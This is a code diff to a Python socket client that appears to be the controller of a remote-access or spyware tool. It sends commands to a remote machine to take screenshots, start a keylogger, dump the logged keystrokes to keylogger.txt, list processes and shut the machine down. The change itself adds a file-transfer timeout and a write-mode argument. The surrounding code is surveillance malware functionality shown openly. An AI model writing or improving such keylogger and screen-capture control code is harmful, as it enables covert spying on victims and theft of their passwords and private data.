@@ -2,7 +2,6 @@ import socket
 import os
 import time
 
-
 # Commands
 CMD_END_CONNECTION = 'end_connection'
 CMD_SHUTDOWN = 'shutdown'
@@ -108,16 +107,19 @@ class Client:
         print("[ERROR] Connection reset")
         exit()
 
-  def save_file(self, path, file_name):
-    # start_time = time.time()
-    with open(os.path.join(path, file_name), 'wb') as f:
+  def save_file(self, path, file_name, mode):
+    start_time = time.time()
+    with open(os.path.join(path, file_name), mode) as f:
       while True:
+        if time.time() - start_time > 6:
+          print("[ERROR] File transfer timeout")
+          break
         data = self.socket.recv(BUFFER_SIZE)
         if data == FLAG_FILE_END.encode():
           break
         else:
           f.write(data)
-  
+
   def recv_msg(self, flag):
     msg = ""
     while True:
@@ -134,7 +136,7 @@ class Client:
 
   def take_screenshot(self):
     self.socket.send(CMD_TAKE_SCREENSHOT.encode())
-    self.save_file(TMP_PATH, 'screenshot.png')
+    self.save_file(TMP_PATH, 'screenshot.png', 'wb')
 
   def start_keylogger(self):
     self.socket.send(CMD_START_KEYLOGGER.encode())
@@ -148,7 +150,7 @@ class Client:
 
   def save_keylogger(self):
     self.socket.send(CMD_PRINT_KEYLOGGER.encode())
-    self.save_file(TMP_PATH, 'keylogger.txt')
+    self.save_file(TMP_PATH, 'keylogger.txt', 'wb')
     
   def view_processes(self):
     self.socket.send(CMD_VIEW_PROCESSES.encode())
